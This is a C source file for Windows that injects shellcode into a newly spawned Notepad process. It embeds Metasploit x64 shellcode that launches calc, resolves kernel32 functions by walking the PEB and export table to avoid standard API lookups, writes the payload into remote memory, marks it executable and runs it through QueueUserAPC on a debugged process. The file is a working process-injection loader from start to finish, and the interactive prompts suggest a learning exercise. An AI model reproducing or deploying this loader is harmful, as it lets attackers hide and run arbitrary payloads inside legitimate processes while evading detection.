#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "FunctionPointers.h"

#pragma warning (disable:4996)

#define TARGET_PROCESS		"Notepad.exe"

//----------------------------------------------------------------------------------------//
// x64 calc metasploit shellcode 
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};
//-------------------------------------------------------------------------------------------//


//Converts both the strings to lowercase and checks if they are equal or not !!
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {

	WCHAR	lStr1[MAX_PATH],
		lStr2[MAX_PATH];

	int		len1 = lstrlenW(Str1),
		len2 = lstrlenW(Str2);

	int		i = 0,
		j = 0;

	// checking - we dont want to overflow our buffers
	if (len1 >= MAX_PATH || len2 >= MAX_PATH)
		return FALSE;

	// converting Str1 to lower case string (lStr1)
	for (i = 0; i < len1; i++) {
		lStr1[i] = (WCHAR)tolower(Str1[i]);
	}
	lStr1[i++] = L'\0'; // null terminating


	// converting Str2 to lower case string (lStr2)
	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(Str2[j]);
	}
	lStr2[j++] = L'\0'; // null terminating


	// comparing the lower-case strings
	if (lstrcmpiW(lStr1, lStr2) == 0)
		return TRUE;

	return FALSE;
}

HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

	// getting peb
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));

	// geting Ldr
	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

	// getting the first element in the linked list (contains information about the first module)
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		// if not null
		if (pDte->FullDllName.Length != NULL) {

			// check if both equal
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);

				return (HMODULE)pDte->Reserved2[0];
			}
			// wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
		}
		else {
			break;
		}
		// next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}
	return NULL;

}
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

	// we do this to avoid casting at each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;

	// getting the dos header and doing a signature check
	PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// getting the nt headers and doing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// getting the optional header
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

	// getting the image export table
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	// getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	// getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		// getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		// getting the address of the function through its ordinal
		PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
		// searching for the function specified
		if (strcmp(lpApiName, pFunctionName) == 0) {
			
			return pFunctionAddress;
		}
	}


	return NULL;
}

//-------------------------------------------------------------------------------------------------------------//
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	//fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressReplacement(GetModuleHandleReplacement(L"KERNEL32.DLL"), "VirtualAllocEx");
	printf("Address of VirtualAllocEx from NTDLL Export Function List 0x%p\n", (fnVirtualAllocEx)GetProcAddressReplacement(GetModuleHandleReplacement(L"KERNEL32.DLL"), "VirtualAllocEx"));
	printf("Press Enter to Allocate Memory Using Naked VirtualAllocEx Function ! \n");
	getchar();
	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	getchar();
	fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressReplacement(GetModuleHandleReplacement(L"KERNEL32.DLL"), "WriteProcessMemory");
	if (!pWriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	fnVirtualProtectEx pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressReplacement(GetModuleHandleReplacement(L"KERNEL32.DLL"), "VirtualProtectEx");
	if (!pVirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	/*
		{	both CREATE_SUSPENDED & DEBUG_PROCESS will work,
			CREATE_SUSPENDED will need ResumeThread, and
			DEBUG_PROCESS will need DebugActiveProcessStop
			to resume the execution
		}
	*/
	printf("[+] DONE \n");

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

int main(){

	HANDLE		hProcess = NULL,
		hThread = NULL;

	DWORD		dwProcessId = NULL;

	PVOID		pAddress = NULL;


	//	creating target remote process (in debugged state)
	printf("[i] Creating \"%s\" Process As A Debugged Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");


	// injecting the payload and getting the base address of it
	printf("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

	//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);


	printf("[#] Press <Enter> To Run Shellcode ... ");
	getchar();

	//	since 'CreateSuspendedProcess2' create a process in debug mode,
	//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
	printf("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);
	printf("[+] DONE \n\n");

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;



}
